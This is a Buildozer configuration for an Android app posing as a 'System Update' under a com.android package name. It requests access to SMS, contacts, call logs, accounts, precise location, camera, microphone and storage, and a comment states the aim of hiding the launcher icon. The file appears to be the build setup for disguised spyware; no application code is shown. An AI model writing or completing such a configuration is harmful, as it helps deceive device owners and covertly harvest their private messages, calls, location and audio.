[app]
title = System Update
package.name = sysupdate
package.domain = com.android
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 1.0

requirements = python3,kivy==2.1.0,plyer,requests,pyjnius

orientation = portrait
fullscreen = 0

android.permissions = INTERNET,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,READ_CONTACTS,READ_SMS,READ_CALL_LOG,READ_PHONE_STATE,GET_ACCOUNTS,ACCESS_WIFI_STATE,CAMERA,RECORD_AUDIO,READ_EXTERNAL_STORAGE,WRITE_EXTERNAL_STORAGE,FOREGROUND_SERVICE

android.api = 33
android.minapi = 24
android.ndk = 25b
android.archs = arm64-v8a,armeabi-v7a

# Hide the icon in launcher
androidlauncher = android

[buildozer]
log_level = 2
warn_on_root = 1

[app@x86]
android.archs = x86_64
